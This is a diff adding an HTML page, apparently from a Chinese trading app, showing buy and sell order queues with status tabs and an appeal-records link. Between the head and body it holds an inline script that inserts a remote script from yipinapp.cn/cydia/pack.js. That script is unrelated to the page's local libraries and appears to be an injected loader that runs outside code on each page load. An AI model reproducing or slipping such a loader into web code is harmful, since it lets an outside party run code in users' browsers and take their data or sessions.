@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>购买</title>
+		<link rel="stylesheet" href="../../static/css/weui-min.css" />
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/transaction/tranRecord.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<div class="transcanIndex">
+			<div class="weui-tab"  id="selectBox">
+				<div class="tranceTitle">
+					<div class="tranLeft" id="returnBtn">
+						<a class="weui-pull-left weui-btns arrow">
+					        <span class="weui-cell__fts"></span>
+					    </a>
+					</div>
+					<div class="weui-bavbar" id="titleFour">
+	    				<a class="bar-active" data-title="1">购买队列</a>
+	    				<a class="" data-title="0">出售队列</a>
+					</div>
+					<div class="tranRight">
+						<a href="appealRecord.html" class="">申诉记录</a>
+					</div>
+				</div>
+				<div class="weui-tab__bd fortile" id="buyNav">
+	    			<div class="weui-tab">
+						<div class="weui-navbar" id="buydiv">
+							<a class="weui-navbar__item weui-bar__item--on" data-type="0" href="#tab01">
+					      		<span>已接单</span>
+					    	</a>
+					    	<a class="weui-navbar__item" data-type="2" id="changeDiv" href="#tab01">
+					    	  	<span class="tabName">已付款</span>
+					    	</a>
+					    	<a class="weui-navbar__item" data-type="3" href="#tab01">
+					    	  	<span>已完成</span>
+					    	</a>
+					    	<a class="weui-navbar__item" data-type="4" href="#tab01">
+					    	  	<span>已取消</span>
+					    	</a>
+						</div>
+						<div class="weui-tab__bd list-main-mian weui-form-preview infinite weui-pull-to-refresh" id="tabtxt">
+							<div class="weui-pull-to-refresh__layer" style="padding: 5px;">
+					            <div class="weui-pull-to-refresh__arrow"></div>
+					            <div class="weui-pull-to-refresh__preloader"></div>
+					            <div class="down">下拉刷新</div>
+					            <div class="up">释放刷新</div>
+					            <div class="refresh">正在刷新</div>
+					        </div>
+						    <div id="tab01" class="weui-tab__bd-item weui-tab__bd-item--active boxContent">
+						    	<ul>
+
+						    	</ul>
+						    	<div class="btnLast">
+
+						    	</div>
+						    </div>
+						    <div class="weui-loadmore">
+					            <i class="weui-loading"></i>
+					            <span class="weui-loadmore__tips">正在加载</span>
+					       	</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js"></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/mybroker.js" ></script>
+	</body>
+</html>
